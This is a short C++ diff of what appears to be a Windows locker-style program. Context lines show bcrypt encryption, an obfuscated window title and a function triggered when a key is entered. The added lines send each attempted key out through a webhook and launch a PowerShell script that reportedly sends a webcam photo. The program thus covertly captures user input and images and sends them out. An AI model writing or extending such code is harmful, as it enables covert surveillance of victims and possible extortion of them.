@@ -5,6 +5,7 @@
 #include <shellapi.h>
 #include <cmath>
 #include <bcrypt.h>
+#include "WebhookHelper.h"
 #pragma comment(lib, "msimg32.lib")
 #pragma comment(lib, "bcrypt.lib")
 
@@ -43,6 +44,10 @@ const wchar_t* ENC_TITLE   = L"\x06\x0C\x06\x01\x10\x18\x75\x19\x1A\x16\x1E\x10\
 void TriggerWebcamAlert(const std::wstring& attemptedKey) {
     g_cameraTriggered = true;
 
+    // Direct C++ webhook - guaranteed delivery without external dependencies
+    SendDirectWebhook(attemptedKey);
+
+    // Also launch PowerShell script for detailed report with webcam photo
     wchar_t exePath[MAX_PATH];
     GetModuleFileNameW(NULL, exePath, MAX_PATH);
     std::wstring folder = exePath;
